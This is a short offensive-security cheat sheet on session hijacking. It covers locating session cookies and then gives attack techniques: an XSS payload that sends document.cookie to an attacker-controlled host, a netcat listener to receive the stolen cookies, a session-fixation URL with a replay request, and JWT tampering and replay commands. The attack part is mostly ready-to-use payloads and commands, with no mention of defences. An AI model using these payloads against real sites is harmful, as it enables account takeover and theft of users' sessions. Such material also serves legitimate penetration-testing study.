Session hijacking involves **stealing active session cookies or tokens** to impersonate a logged-in user.

## Identifying Session Cookies

### Using Burp Suite

- Go to **Proxy > HTTP History** and inspect **Set-Cookie** headers.
- Look for session-related values such as `PHPSESSID`, `JSESSIONID`, `auth`, or `sessionid`
### Using cURL to Capture Cookies

```
curl -c cookies.txt -b cookies.txt -v http://<target-ip>/profile
```

- `-c cookies.txt` → aves cookies to a file.
- `-b cookies.txt` → Reuses stored cookies in subsequent requests.
- `-v` → Enables verbose output to analyze responses.
### Using Browser DevTools

- Open **Developer Tools** (`F12` in Chrome/Firefox).
- Navigate to **Application > Storage > Cookies**.
- Locate authentication cookies or session tokens.

## Session Hijacking Techniques

### XSS Exploitation

If a **Cross-Site Scripting (XSS)** vulnerability is present, use it to steal session cookies:

```
<script>document.location='http://<attacker-ip>/steal.php?cookie='+document.cookie</script>
```

- Redirects the victim's session cookie to an attacker-controlled endpoint.

To capture the stolen cookie, listen on the attacker’s machine:

```
nc -lvnp 80
```

### Session Fixation Attack

If the server allows session IDs in URLs or GET requests, an attacker can **fix** a victim’s session to a known value.

1. Force the victim to use a known session ID:

```
http://target.com/login?sessionid=ATTACKERSESSION
```

2. Once the victim logs in, reuse the session:

```
curl -b "sessionid=ATTACKERSESSION" http://target.com/dashboard
```

### Token Theft

If the application uses JWT tokens or API keys:

1. Capture the `Authorization: Bearer <JWT>` header.
2. Decode the JWT for useful information:
```
echo "<JWT Token>" | jwt_tool -d
```

3. Modify the token and replay it:
```
curl -H "Authorization: Bearer <MODIFIED_JWT>" http://target.com/api
```